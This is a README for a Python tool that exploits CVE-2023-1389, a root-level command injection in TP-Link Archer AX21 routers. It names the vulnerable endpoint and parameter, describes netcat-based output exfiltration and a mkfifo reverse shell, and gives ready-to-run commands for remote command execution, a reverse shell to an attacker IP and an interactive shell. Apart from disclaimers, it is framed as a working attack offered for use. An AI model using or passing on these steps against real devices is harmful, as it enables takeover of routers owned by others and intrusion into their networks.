# TP-Link Archer AX21 Command Injection Exploit (CVE-2023-1389)

## Overview

This Python tool exploits a critical command injection vulnerability (CVE-2023-1389) in TP-Link Archer AX21 routers. It allows remote attackers to execute arbitrary commands, retrieve their output, or establish a reverse shell on vulnerable devices. The tool supports both GET and POST exploitation methods and provides multiple modes for flexible usage.

> **WARNING:** This tool is for authorized security testing and educational purposes only. Unauthorized use against devices you do not own or have explicit permission to test is illegal and unethical. The author is not responsible for any misuse or resulting damages.

---

## Features

- **GET/POST Exploitation**: Choose between HTTP GET or POST payload delivery.
- **Remote Command Execution**: Run arbitrary shell commands on the target router and retrieve output.
- **Reverse Shell**: Gain an interactive shell on the router via a reverse connection.
- **Interactive Shell Mode**: Issue multiple commands interactively.
- **Automatic Input Validation**: Checks for valid IP addresses and ports.
- **SSL/TLS Warning Suppression**: Automatically disables SSL certificate warnings for ease of use.
- **User-Friendly CLI**: Clear help messages and usage instructions.

---

## Technical Background

- **Vulnerability**: TP-Link Archer AX21 routers are vulnerable to command injection via the `country` parameter in the `/cgi-bin/luci/;stok=/locale` endpoint.
- **Attack Vector**: Unsanitized input allows attackers to inject shell commands, executed with root privileges.
- **Payload Delivery**: The exploit works over both HTTP and HTTPS and can use either GET or POST requests.
- **Output Retrieval**: Uses temporary files and netcat to exfiltrate command output back to the attacker.
- **Reverse Shell**: Employs a classic mkfifo-based bash reverse shell payload.

---

## Requirements

- Python 3.6+
- Linux system (for netcat compatibility)
- TP-Link Archer AX21 router (vulnerable firmware)
- Python dependencies: `requests`, `urllib3`

### Install dependencies

```bash
pip install -r requirements.txt
```

---

## Usage

### Basic Syntax

```bash
python3 CVE-2023-1389.py -a <ATTACKER_IP> [MODE] [OPTIONS]
```

### Arguments

- `-r`, `--router`       : Target router IP address (default: 192.168.0.1)
- `-a`, `--attacker`     : Your (attacker) IP address (**required**)
- `-p`, `--port`         : Local port for netcat listener (default: 9999)
- `-m`, `--method`       : HTTP method (`get` or `post`, default: `get`)
- `-t`, `--timeout`      : Request timeout in seconds (default: 5)
- `--https`              : Use HTTPS (default: enabled)
- `--no-https`           : Use HTTP

#### Modes (choose one, required)

- `-c`, `--command`      : Execute a single command on the router
- `-s`, `--shell`        : Obtain a reverse shell from the router
- `-i`, `--interactive`  : Interactive command shell mode

---

## Examples

**Execute a single command and retrieve output:**
```bash
python3 CVE-2023-1389.py -a 192.168.1.100 -c "id"
```

**Get a reverse shell:**
```bash
# In a separate terminal, start a listener:
nc -lvnp 9999

# Then run the exploit:
python3 CVE-2023-1389.py -a 192.168.1.100 -s
```

**Interactive shell mode:**
```bash
python3 CVE-2023-1389.py -a 192.168.1.100 -i
```

**Using POST method and HTTP:**
```bash
python3 CVE-2023-1389.py -a 192.168.1.100 -m post --no-https -c "uname -a"
```

---

## Troubleshooting & FAQ

- **No output received:**  
  Ensure your firewall allows incoming connections on the specified port. Make sure the router is reachable and running a vulnerable firmware version.

- **SSL/TLS errors:**  
  SSL warnings are suppressed, but if you encounter connection issues, try using `--no-https`.

- **Netcat not found:**  
  This tool requires `nc` (netcat) to be installed on your system.

- **Reverse shell fails to connect:**  
  Double-check your IP and port, and ensure your listener is running before sending the payload.

---

## Security, Ethics & Legal Notice

- Use this tool only on devices you own or have explicit permission to test.
- Unauthorized testing is illegal and unethical.
- You are solely responsible for your actions and any consequences arising from the use of this tool.

---

## Contribution

Contributions, improvements, and pull requests are welcome. Please open an issue for suggestions or bug reports.

---

## References

- [CVE-2023-1389 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2023-1389)
- [Original Advisory / Exploit Details](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-1389)
- [Exploit-DB Entry](https://www.exploit-db.com/exploits/)


## 📷Screenshot
![whoami](https://github.com/user-attachments/assets/a4e89a21-919c-4539-a1b1-452da02dadfa)


---

## Disclaimer

This software is provided for educational and authorized security testing purposes only. The author assumes no liability for any misuse or damage caused by this tool.

---

If you have questions or wish to contribute, please open an issue or contact the repository maintainer.
